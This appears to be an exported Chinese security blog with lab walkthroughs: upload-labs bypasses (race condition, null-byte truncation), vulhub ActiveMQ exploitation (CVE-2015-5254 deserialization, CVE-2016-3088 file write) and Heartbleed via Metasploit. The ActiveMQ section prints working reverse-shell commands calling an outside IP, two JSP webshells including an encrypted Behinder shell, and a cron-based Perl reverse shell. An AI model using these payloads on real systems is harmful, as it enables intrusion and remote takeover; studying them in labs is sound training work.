<h1 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h1><p>分析源码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//index.php</span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    require_once(&quot;./myupload.php&quot;);</span><br><span class="line">    $imgFileName =time();</span><br><span class="line">    $u = new MyUpload($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;], $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $_FILES[&#x27;upload_file&#x27;][&#x27;size&#x27;],$imgFileName);</span><br><span class="line">    $status_code = $u-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    switch ($status_code) &#123;</span><br><span class="line">        case 1:</span><br><span class="line">            $is_upload = true;</span><br><span class="line">            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;</span><br><span class="line">            break;</span><br><span class="line">        case 2:</span><br><span class="line">            $msg = &#x27;文件已经被上传，但没有重命名。&#x27;;</span><br><span class="line">            break; </span><br><span class="line">        case -1:</span><br><span class="line">            $msg = &#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;;</span><br><span class="line">            break; </span><br><span class="line">        case -2:</span><br><span class="line">            $msg = &#x27;上传失败，上传目录不可写。&#x27;;</span><br><span class="line">            break; </span><br><span class="line">        case -3:</span><br><span class="line">            $msg = &#x27;上传失败，无法上传该类型文件。&#x27;;</span><br><span class="line">            break; </span><br><span class="line">        case -4:</span><br><span class="line">            $msg = &#x27;上传失败，上传的文件过大。&#x27;;</span><br><span class="line">            break; </span><br><span class="line">        case -5:</span><br><span class="line">            $msg = &#x27;上传失败，服务器已经存在相同名称文件。&#x27;;</span><br><span class="line">            break; </span><br><span class="line">        case -6:</span><br><span class="line">            $msg = &#x27;文件无法上传，文件不能复制到目标目录。&#x27;;</span><br><span class="line">            break;      </span><br><span class="line">        default:</span><br><span class="line">            $msg = &#x27;未知错误！&#x27;;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//myupload.php</span><br><span class="line">class MyUpload&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  var $cls_arr_ext_accepted = array(</span><br><span class="line">      &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;,</span><br><span class="line">      &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  /** upload()</span><br><span class="line">   **</span><br><span class="line">   ** Method to upload the file.</span><br><span class="line">   ** This is the only method to call outside the class.</span><br><span class="line">   ** @para String name of directory we upload to</span><br><span class="line">   ** @returns void</span><br><span class="line">  **/</span><br><span class="line">  function upload( $dir )&#123;</span><br><span class="line">    </span><br><span class="line">    $ret = $this-&gt;isUploadedFile();</span><br><span class="line">    </span><br><span class="line">    if( $ret != 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = $this-&gt;setDir( $dir );</span><br><span class="line">    if( $ret != 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = $this-&gt;checkExtension();</span><br><span class="line">    if( $ret != 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = $this-&gt;checkSize();</span><br><span class="line">    if( $ret != 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // if flag to check if the file exists is set to 1</span><br><span class="line">    </span><br><span class="line">    if( $this-&gt;cls_file_exists == 1 )&#123;</span><br><span class="line">      </span><br><span class="line">      $ret = $this-&gt;checkFileExists();</span><br><span class="line">      if( $ret != 1 )&#123;</span><br><span class="line">        return $this-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // if we are here, we are ready to move the file to destination</span><br><span class="line"></span><br><span class="line">    $ret = $this-&gt;move();</span><br><span class="line">    if( $ret != 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // check if we need to rename the file</span><br><span class="line"></span><br><span class="line">    if( $this-&gt;cls_rename_file == 1 )&#123;</span><br><span class="line">      $ret = $this-&gt;renameFile();</span><br><span class="line">      if( $ret != 1 )&#123;</span><br><span class="line">        return $this-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // if we are here, everything worked as planned :)</span><br><span class="line"></span><br><span class="line">    return $this-&gt;resultUpload( &quot;SUCCESS&quot; );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>​    这关也存在条件竞争的问题，不过这题对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，因此可以通过不断上传图片马，由于条件竞争可能来不及重命名，从而上传成功。</p>
<h1 id="Pass-19-00截断"><a href="#Pass-19-00截断" class="headerlink" title="Pass-19 00截断"></a>Pass-19 00截断</h1><p>分析源码：</p>
<p>​    发现move_uploaded_file()函数中的img_path是由post参数save_name控制的，因此可以在save_name利用00截断绕过，方法同pass-12</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[&#x27;save_name&#x27;];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        if(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name;</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $msg = &#x27;禁止保存为该类型文件！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h1><p>分析源码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file = explode(&#x27;.&#x27;, strtolower($file));</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>​    通过源码发现该过滤方式是以explode()函数把字符串打散为数组，end() 函数将数组内部指针指向最后一个元素，并返回该元素的值（如果成功），这里是取post参数数组中的最后一个文件名。reset() 函数将内部指针指向数组中的第一个元素并输出。可控点为save_name。save_name[3]=conn19.php，save_name[5]=jpg，$ext=jpg过白名单，</p>
<p>​    reset($file)=conn19.php $file[1]=nul，就成功上传conn19.php.(多出个点但是windows自动去掉了没影响)。还可以尝试，1=conn19，2=php，3=jpg，或者Pass19的00截断，0=conn19.php(0x00)，1=jpg</p>
<h1 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h1><p>​    本人在学习过程中遇到了许多的BUG，无法解决，有点心态爆炸。但还是坚持将靶场打完，所以过程中缺少了许多实操的图片。</p>
<p>​    我参考多篇文章后写下这篇文章，所以这不能算是我的原创把。大家感兴趣的话可以点击以下连接查看参考文章：</p>
<p>​    <a href="https://www.cnblogs.com/whitedream-/p/14501515.html">参考文章一</a></p>
<p>​    <a href="https://blog.csdn.net/weixin_44677409/article/details/92799366">参考文章二</a></p>
<p>​    <a href="https://cloud.tencent.com/developer/article/1740497">参考文章三</a></p>
]]></content>
  </entry>
  <entry>
    <title>vulhub漏洞—ActiveMQ</title>
    <url>/2021/12/08/vulhub%E6%BC%8F%E6%B4%9E%E2%80%94ActiveMQ/</url>
    <content><![CDATA[<h1 id="ActiveMQ"><a href="#ActiveMQ" class="headerlink" title="ActiveMQ"></a><strong>ActiveMQ</strong></h1><p><strong>Apache ActiveMQ</strong>是<a href="https://baike.baidu.com/item/Apache%E8%BD%AF%E4%BB%B6%E5%9F%BA%E9%87%91%E4%BC%9A">Apache软件基金会</a>所研发的开放源代码<a href="https://baike.baidu.com/item/%E6%B6%88%E6%81%AF%E4%B8%AD%E9%97%B4%E4%BB%B6">消息中间件</a>；由于ActiveMQ是一个纯<a href="https://baike.baidu.com/item/Java">Java</a>程序，因此只需要<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F">操作系统</a>支持<a href="https://baike.baidu.com/item/Java%E8%99%9A%E6%8B%9F%E6%9C%BA">Java虚拟机</a>，ActiveMQ便可执行。、</p>
<p>参考文章</p>
<p><a href="https://www.cnblogs.com/yanfei1819/p/10615605.html">消息中间件ActiveMQ使用详解 - 追梦1819 - 博客园</a></p>
<p><a href="https://blog.csdn.net/qq_36807862/article/details/81283951">ActiveMQ详解_一念成佛_LHY的博客-CSDN博客_activemq</a></p>
<span id="more"></span>

<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>Goby扫描资产</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035644.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 发现端口 8161和61616，我们访问一波</p>
<p>8161是web管理页面端口</p>
<p>61616端口则是工作端口，<strong>消息在这个端口进行传递</strong></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035018.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035769.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h1><h2 id="ActiveMQ-反序列化漏洞（CVE-2015-5254）"><a href="#ActiveMQ-反序列化漏洞（CVE-2015-5254）" class="headerlink" title="ActiveMQ 反序列化漏洞（CVE-2015-5254）"></a>ActiveMQ 反序列化漏洞（CVE-2015-5254）</h2><h3 id="漏洞利用过程如下："><a href="#漏洞利用过程如下：" class="headerlink" title="漏洞利用过程如下："></a><strong>漏洞利用过程如下：</strong></h3><ol>
<li>生成序列化的有效负载（你可以使用 ysoserial）</li>
<li>将有效负载发送到端口 61616</li>
<li>访问web管理页面并读取序列化消息，然后您就可以触发漏洞。</li>
</ol>
<p>为了利用这个环境，我们将使用<a href="https://github.com/matthiaskaiser/jmet">jmet</a>（Java 消息利用工具）。首先下载jmet的jar文件，在同一目录下创建<strong>external</strong>文件夹（否则可能会出现文件夹不存在的错误）。</p>
<p>jmet是使用ysoserial生成Payload并发送（jar自带ysoserial，我们不需要重新下载），所以我们需要选择一个可以在ysoserial中使用的gadget，比如ROME .</p>
<p>使用<a href="https://github.com/matthiaskaiser/jmet/releases">jmet</a>进行漏洞利用。首先下载jmet的jar文件</p>
<p>jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/success&quot; -Yp ROME 靶机IP 61616</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/cd94d807641142ef9ab696a1e3d2e703.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>此时，会给目标ActiveMQ添加一个名为event的队列，可以过 <code>http://IP:8161/admin/browse.jsp?JMSDestination=event</code> 看到这个队列的所有消息</p>
<p>弱口令 admin admin 登录</p>
<p><img src="https://img-blog.csdnimg.cn/644242d56d7d4cc8a88f74392e8d0c6f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>点击此条消息，如果在靶机docker中的<code>/tmp</code>目录下中创建了<code>success</code>文件，则表明该漏洞可以利用</p>
<h1 id><a href="#" class="headerlink" title></a></h1><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>bash 命令直弹</p>
<p>反弹shell时要将命令base64加密后发送，利用bash在目标机解密执行，在不加密的情况下执行命令不能反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">进行base64编码</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/ip/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035561.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jmet 命令</span><br><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,base64编码结果替换此段文字&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 101.35.15.184 61616</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035623.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 命令执行成功后，在8161端口中找到我们提交的记录，当点击该条记录则直接反弹回shell</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035941.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">监听端口4444，反弹成功~</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035667.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="ActiveMQ-任意文件上传漏洞（CVE-2016-3088）"><a href="#ActiveMQ-任意文件上传漏洞（CVE-2016-3088）" class="headerlink" title="ActiveMQ 任意文件上传漏洞（CVE-2016-3088）"></a>ActiveMQ 任意文件上传漏洞（CVE-2016-3088）</h2><h3 id="背景简述"><a href="#背景简述" class="headerlink" title="背景简述"></a><strong>背景简述</strong></h3><p>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。</p>
<p>fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：</p>
<p>其使用率并不高<br> 文件操作容易出现漏洞<br> 所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。</p>
<p>在测试过程中，可以关注ActiveMQ的版本，避免走弯路。</p>
<h3 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a><strong>漏洞详情</strong></h3><p>这个漏洞出现在Fileserver应用中，漏洞原理其实很简单，就是fileserver支持写文件（但不解析JSP），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用移动请求将其移动到任何位置，从而导致任意文件写入漏洞。</p>
<p>写入cron或ssh key等文件</p>
<ol>
<li>编写Webshell</li>
<li>写入cron或ssh key等文件</li>
<li>编写jar或jetty.xml等库和配置文件</li>
</ol>
<p>写webshell的好处是方便，但是fileserver不解析jsp，admin和api都需要登录才能访问，有点白费力气；写cron或者ssh key的好处是直接反向Shell，也方便，坏处是需要root权限；写jar，有点麻烦（需要jar后门），写xml配置文件，这个方法比较靠谱，但是有一个徒劳的地方：我们需要知道ActiveMQ的绝对路径。</p>
<h3 id="-1"><a href="#-1" class="headerlink" title></a></h3><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>首先我们使用的put方式上传了test.txt文件到fileserver目录下面，但是在该目录下面的文件是不能够被执行的，执行JSP脚本的目录是admin或者是api目录下面，这两个目录具有执行JSP文件的权限，但是这两个目录需要登陆才能够进入，所以可能会存在4XX的错误，这是没有权限的原因。</p>
<p>骚姿势：fileserver目录可以支持写入文件，并且该目录也支持move文件到其他的目录下面，因此我们可以通过上传shell脚本文件到fileserver目录下面，然后将该目录下面的文件移动到解析jsp文件的目录下面，这样就可以造成任意文件写入的漏洞。</p>
<p>上传文件 test.txt </p>
<p> <img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035813.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>修改数据包，123456 不要删除</p>
<p>MOVE /fileserver/1.txt HTTP/1.1</p>
<p>Destination:file:///opt/activemq/webapps/api/testhacker.jsp</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/62178b3707014be2a0e9ff4a2ef6c73d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h3 id="EXP1"><a href="#EXP1" class="headerlink" title="EXP1:"></a>EXP1:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if(request.getParameter(&quot;pass&quot;)!=null)&#123;String k=(&quot;&quot;+UUID.randomUUID()).replace(&quot;-&quot;,&quot;&quot;).substring(16);session.putValue(&quot;u&quot;,k);out.print(k);return;&#125;Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> <img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035608.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> <img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035475.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035869.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>上传冰蝎马，之后不能利用，因为系统需要登录，无法直接利用，访问shell地址可以成功执行</p>
<h3 id="EXP2："><a href="#EXP2：" class="headerlink" title="EXP2："></a>EXP2：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ page import=&quot;java.io.*&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">out.print(&quot;Hello&lt;/br&gt;&quot;);</span><br><span class="line"> </span><br><span class="line">String strcmd=request.getParameter(&quot;cmd&quot;);</span><br><span class="line"> </span><br><span class="line">String line=null;</span><br><span class="line"> </span><br><span class="line">Process p=Runtime.getRuntime().exec(strcmd);</span><br><span class="line"> </span><br><span class="line">BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));</span><br><span class="line"> </span><br><span class="line">while((line=br.readLine())!=null)&#123;</span><br><span class="line"> </span><br><span class="line">  out.print(line+&quot;&lt;/br&gt;&quot;);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035198.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> <img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035455.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h3 id="写入计划任务"><a href="#写入计划任务" class="headerlink" title="写入计划任务"></a>写入计划任务</h3><p> 首先上传cron配置文件，返回状态码204表示成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*/1 * * * * root /usr/bin/perl -e &#x27;use Socket;$i=&quot;反弹IP&quot;;$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035403.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 将其移动到/etc/cron.d/root：</p>
<p>成功移动后shell自动弹到反弹主机的7777端口，nc监听即可。</p>
<p>这个方法需要ActiveMQ是root运行，否则也不能写入cron文件。</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035103.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>反弹成功~</p>
<p><img src="https://img-blog.csdnimg.cn/96025a5455034e8fbef650bf4dd0139b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
]]></content>
      <tags>
        <tag>vulhub漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>vulhub漏洞—Heartbleed</title>
    <url>/2021/12/08/vulhub%E6%BC%8F%E6%B4%9E%E2%80%94Heartbleed/</url>
    <content><![CDATA[<h1 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h1><p>心脏出血是OpenSSL1.0.1版本至OpenSSL1.0.1f Beta1版本中存在漏洞，该漏洞中文名称为心脏滴血，英文名称为HeartBleed。其中Heart是指该漏洞位于心跳协议上，Bleed是因为该漏洞会造成数据泄露。即HeartBleed是在心跳协议上的一个数据泄露漏洞，OpenSSL库中用到了该心跳协议。HeartBleed主要存在与OpenSSL的1.0.1版本到1.0.1f版本。利用该漏洞，攻击者可以远程读取服务器内存中64K的数据，获取内存中的敏感信息。</p>
<p>Heartbleed漏洞是由于未能在memcpy()调用受害用户输入内容作为长度参数之前正确进行边界检查。攻击者可以追踪OpenSSL所分配的64KB缓存、将超出必要范围的字节信息复制到缓存当中再返回缓存内容，这样一来受害者的内存内容就会以每次64KB的速度进行泄露。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>nmap 扫描靶机 ip </p>
<p>nmap -Pn 123.56.82.231</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081027422.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 使用nmap自带的<a href="https://www.zhihu.com/search?q=ssl-heartbleed.nse&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:174633152%7D">ssl-heartbleed.nse</a>脚本对靶机进行扫描看是否存在该漏洞</p>
<span id="more"></span>

<p>扫描 443端口 发现存漏洞</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081027569.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>使用msfconsole 进行漏洞利用</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081027216.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 用 search heartbleed 搜索漏洞利用模块</p>
<p>use 1</p>
<p>set RHOSTS ip</p>
<p>set RPORT 端口</p>
<p>set verbose true   #(设置verbose，这个设置要设置成true才能看到泄露的信息)</p>
<p>exploit</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081027600.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
